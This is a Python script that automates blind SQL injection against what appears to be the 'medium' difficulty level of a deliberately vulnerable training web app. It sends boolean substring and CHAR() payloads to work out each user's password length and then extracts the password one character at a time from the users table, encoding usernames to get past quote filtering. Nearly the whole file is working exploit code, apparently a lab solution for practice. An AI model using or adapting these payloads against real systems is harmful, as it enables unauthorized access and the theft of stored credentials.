#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

from conf import BASE_URL, USERS, ALPHABET
from util import http_post

URL = BASE_URL + "/vulnerabilities/sqli_blind/"    
DIFFICULTY = "medium"

# ----------------------------------------------------------------

def sqli_blind_medium():
    global URL, USERS    
    for user in USERS:
        password = get_password(sql2bool, user)

# -----

def sql2bool(sql_payload):
    global URL, DIFFICULTY    
    data = f"id={sql_payload}&Submit=Submit"
    r = http_post(URL, DIFFICULTY, data=data)
    return "exists" in r.text

# ----------------------------------------------------------------

def get_password(sql2bool, username):
    global ALPHABET

    password_length = get_password_length(sql2bool, username)
    username_sql_code = encode_user_condition(username)
    
    print(f"[INFO] - Password for username: {username} has {password_length} length")
    print(f"[INFO] - Password for {username} is ", end="")
    password = ""
    for i in range(1, password_length + 1):
        for c in ALPHABET:
            sql_payload = f"1 AND (select substring(password, {i}, 1) from users where {username_sql_code}) = CHAR({ord(c)}) #"
            if sql2bool(sql_payload):
                password += c
                print(c, end="", flush=True)
                break

    print("\n", end="")
    return password

# -----

def get_password_length(sql2bool, user):
    global DIFFICULTY    
    username_sql = encode_user_condition(user)    
    MAX_LENGTH = 100
    for i in range(1, MAX_LENGTH):
        sql_payload = f"1 AND (select 1 from users where {username_sql} and LENGTH(password) > {i}) = 1 #"
        if not sql2bool(sql_payload):
            return i

# -----

def encode_user_condition(user):
    sql = ""
    for i, c in enumerate(user):
        sql += f"substring(first_name, {i+1}, 1) = CHAR({ord(c)}) AND "
    return sql[:-5]
